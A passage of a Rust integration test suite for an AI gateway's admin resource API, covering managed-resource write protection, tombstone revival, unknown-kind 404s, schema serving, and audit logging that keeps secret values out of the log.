    let path = format!("/admin/resources/rate_limit_policies/{id}");
    let r = admin.get(&path).await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["managed_by"], owner.as_str());
    let r = admin
        .put(
            &path,
            Some("\"1\""),
            json!({"doc": classic_rate_limit("rl-hijack")}),
        )
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(r.body["code"], "managed_resource");
    let r = admin.delete(&path, Some("\"1\"")).await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(r.body["code"], "managed_resource");

    let (doc, _, version, _, deleted, managed_by) =
        stored(&cp, "rate_limit_policies", &id.to_string()).await;
    assert_eq!((version, deleted), (1, false));
    assert_eq!(doc["name"], "rl-tenant");
    assert_eq!(managed_by.as_deref(), Some(owner.as_str()));

    // Its owner can still change it.
    let row = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Replace(classic_rate_limit("rl-tenant-2")),
        Some(1),
        Some(&owner),
    )
    .await
    .expect("the owner's write");
    assert_eq!(row.version, 2);
}

#[tokio::test]
async fn creating_again_an_id_whose_row_is_a_tombstone_revives_it() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let id = Uuid::new_v4();
    let first = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Create(classic_rate_limit("rl-1")),
        None,
        None,
    )
    .await
    .expect("create");
    assert_eq!(first.version, 1);
    let e = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Create(classic_rate_limit("rl-1b")),
        None,
        None,
    )
    .await
    .expect_err("a live id is not created twice");
    assert_eq!(e.status, 409);

    let gone = write(&cp, Kind::RateLimitPolicies, id, Op::Delete, Some(1), None)
        .await
        .expect("delete");
    assert_eq!((gone.version, gone.deleted), (2, true));
    let revived = write(
        &cp,
        Kind::RateLimitPolicies,
        id,
        Op::Create(classic_rate_limit("rl-2")),
        None,
        None,
    )
    .await
    .expect("revive");
    assert_eq!((revived.version, revived.deleted), (3, false));
    assert_eq!(revived.doc["name"], "rl-2");

    let admin = Admin::as_role(&cp, OperatorRole::Viewer).await;
    let r = admin
        .get(&format!("/admin/resources/rate_limit_policies/{id}"))
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["version"], 3);
    assert_eq!(r.body["doc"]["name"], "rl-2");
}

#[tokio::test]
async fn an_unknown_kind_is_404() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Admin).await;
    for kind in ["widgets", "mcp_servers", "model"] {
        let one = format!("/admin/resources/{kind}/{}", Uuid::new_v4());
        for r in [
            admin.get(&format!("/admin/resources/{kind}")).await,
            admin
                .post(
                    &format!("/admin/resources/{kind}"),
                    json!({"doc": {"name": "x"}}),
                )
                .await,
            admin.get(&one).await,
            admin
                .put(&one, Some("\"1\""), json!({"doc": {"name": "x"}}))
                .await,
            admin.delete(&one, Some("\"1\"")).await,
        ] {
            assert_eq!(r.status, 404, "{kind}: {r:?}");
            assert_eq!(r.body["code"], "unknown_kind", "{kind}: {r:?}");
        }
    }
    let r = admin.get("/admin/schemas/widgets").await;
    assert_eq!(r.status, 404, "{r:?}");
    assert_eq!(r.body["code"], "unknown_kind");
    // A known kind with an id that names nothing is a plain 404.
    let r = admin
        .get(&format!("/admin/resources/models/{}", Uuid::new_v4()))
        .await;
    assert_eq!(r.status, 404, "{r:?}");
    assert_eq!(r.body["code"], "not_found");
    let r = admin.get("/admin/resources/models/not-a-uuid").await;
    assert_eq!(r.status, 404, "{r:?}");
    assert_eq!(r.body["code"], "not_found");
}

#[tokio::test]
async fn the_served_schema_is_the_published_file() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Viewer).await;
    let repo_root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    for r in aisix_core::models::schema::RESOURCES {
        let served = admin.get(&format!("/admin/schemas/{r}")).await;
        assert_eq!(served.status, 200, "{r}: {served:?}");
        let file: Value = serde_json::from_str(
            &std::fs::read_to_string(repo_root.join(format!("schemas/resources/{r}.schema.json")))
                .unwrap_or_else(|e| panic!("read the {r} schema: {e}")),
        )
        .unwrap_or_else(|e| panic!("parse the {r} schema: {e}"));
        assert_eq!(served.body, file, "{r}");
    }
}

#[test]
fn every_generic_fixture_loads_on_the_lenient_schema() {
    let (pk, model, guardrail) = (
        Uuid::new_v4().to_string(),
        Uuid::new_v4().to_string(),
        Uuid::new_v4().to_string(),
    );
    let fixtures = generic_fixtures(&pk, &model, &guardrail);
    let mut kinds: Vec<Kind> = fixtures.iter().map(|(k, _)| *k).collect();
    for (kind, doc) in fixtures {
        let mut doc = doc;
        rename_aliases(kind, &mut doc).expect("one spelling per field");
        validate_strict(kind, &doc).unwrap_or_else(|e| panic!("{kind:?} strict: {e:?}"));
        validate_lenient(kind, &doc).unwrap_or_else(|e| panic!("{kind:?} lenient: {e}"));
    }
    kinds.sort_by_key(|k| k.segment());
    let mut writable: Vec<Kind> = Kind::ALL
        .into_iter()
        .filter(|k| k.generic_writable())
        .collect();
    writable.sort_by_key(|k| k.segment());
    assert_eq!(kinds, writable, "a fixture for every generic kind");
}

#[tokio::test]
async fn every_write_is_audited_without_secret_values() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let pk = admin
        .create("provider_keys", provider_key("acct-audit"))
        .await;
    let model = admin
        .create("models", direct_model("chat-audit", &pk))
        .await;
    let guardrail = admin
        .create(
            "guardrails",
            json!({"name": "kw-audit", "kind": "keyword", "patterns": [{"kind": "literal", "value": "forbidden-7c1"}]}),
        )
        .await;
    let mut created = vec![
        ("provider_keys", pk.clone()),
        ("models", model.clone()),
        ("guardrails", guardrail.clone()),
    ];
    for (kind, doc) in generic_fixtures(&pk, &model, &guardrail) {
        let id = admin.create(kind.segment(), doc).await;
        created.push((kind.segment(), id));
    }
    let mut changed = provider_key("acct-audit");
    changed["groups"] = json!(["grp-audit-7c1"]);
    let r = admin
        .put(
            &format!("/admin/resources/provider_keys/{pk}"),
            Some("\"1\""),
            json!({"doc": changed}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    let rl = &created
        .iter()
        .find(|(k, _)| *k == "rate_limit_policies")
        .expect("a policy")
        .1;
    let r = admin
        .delete(
            &format!("/admin/resources/rate_limit_policies/{rl}"),
            Some("\"1\""),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");

    let rows: Vec<(String, String, Option<String>, Value)> = sqlx::query_as(
        "SELECT action, target_kind, target_id, detail FROM audit_log \
         WHERE action LIKE 'resource.%' ORDER BY id",
    )
    .fetch_all(cp.db().pool())
    .await
    .expect("read the audit log");
    assert_eq!(rows.len(), created.len() + 2, "{rows:?}");
    for ((action, target_kind, target_id, detail), (kind, id)) in rows.iter().zip(&created) {
        assert_eq!(action, "resource.create");
        assert_eq!(target_kind, kind);
        assert_eq!(target_id.as_deref(), Some(id.as_str()));
        assert!(detail["fields"].is_array(), "{detail}");
    }
    let (action, target_kind, target_id, detail) = &rows[created.len()];
    assert_eq!(action, "resource.update");
    assert_eq!(target_kind, "provider_keys");
    assert_eq!(target_id.as_deref(), Some(pk.as_str()));
    assert_eq!(
        detail["fields"],
        json!(["api_key", "display_name", "groups", "provider"])
    );
    let (action, target_kind, target_id, _) = &rows[created.len() + 1];
    assert_eq!(action, "resource.delete");
    assert_eq!(target_kind, "rate_limit_policies");
    assert_eq!(target_id.as_deref(), Some(rl.as_str()));

    // Field names only: no value, so no secret, ever reaches the log.
    assert!(!database_text(&cp).await.contains(SECRET));
    assert!(
        !audit_text(&cp).await.contains("forbidden-7c1"),
        "a value reached the audit log"
    );
    let audit = admin.get("/admin/audit?limit=500").await;
    assert!(!audit.body.to_string().contains(SECRET));

    // What the projector will send, the stored document unsealed, loads on
    // the gateway's read schema.
    for (kind, id) in &created {
        let kind = Kind::from_segment(kind).expect("a kind");
        let (mut doc, _, _, _, deleted, _) = stored(&cp, kind.segment(), id).await;
        if deleted {
            continue;
        }
        secrets::unseal(
            cp.master_key(),
            kind,
            Uuid::parse_str(id).expect("a uuid"),
            &mut doc,
        )
        .expect("unseal");
        validate_lenient(kind, &doc).unwrap_or_else(|e| panic!("{kind:?} {id}: {e}"));
    }
}

#[tokio::test]
async fn budget_policy_is_a_singleton_keyed_by_env_id() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let env_id = cp.env().env_id.to_string();
    let policy = json!({"closed_grace_seconds": 60, "fail_mode": "sticky"});

    let id = admin.create("budget_policy", policy.clone()).await;
    assert_eq!(id, env_id);
    let r = admin
        .post("/admin/resources/budget_policy", json!({ "doc": policy }))
        .await;
    assert_eq!(r.status, 409, "{r:?}");
    assert_eq!(live_count(&cp, "budget_policy").await, 1);

    let path = format!("/admin/resources/budget_policy/{env_id}");
    let r = admin
        .put(
            &path,
            Some("\"1\""),
            json!({"doc": {"closed_grace_seconds": 120, "fail_mode": "closed"}}),
        )
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["id"], env_id.as_str());
    assert_eq!(r.body["doc"]["fail_mode"], "closed");

    let r = admin.get("/admin/resources/budget_policy").await;
    let items = r.body["items"].as_array().expect("items");
    assert_eq!(items.len(), 1, "{items:?}");
    assert_eq!(items[0]["id"], env_id.as_str());
    let r = admin
        .get(&format!(
            "/admin/resources/budget_policy/{}",
            Uuid::new_v4()
        ))
        .await;
    assert_eq!(r.status, 404, "{r:?}");
}

#[tokio::test]
async fn a_provider_key_with_groups_is_accepted() {
    let Some(cp) = TestCp::start().await else {
        return;
    };
    let admin = Admin::as_role(&cp, OperatorRole::Operator).await;
    let mut doc = provider_key("acct-groups");
    doc["groups"] = json!(["shared", "grp-alpha-7c1"]);
    let id = admin.create("provider_keys", doc).await;
    let r = admin
        .get(&format!("/admin/resources/provider_keys/{id}"))
        .await;
    assert_eq!(r.status, 200, "{r:?}");
    assert_eq!(r.body["doc"]["groups"], json!(["shared", "grp-alpha-7c1"]));
}
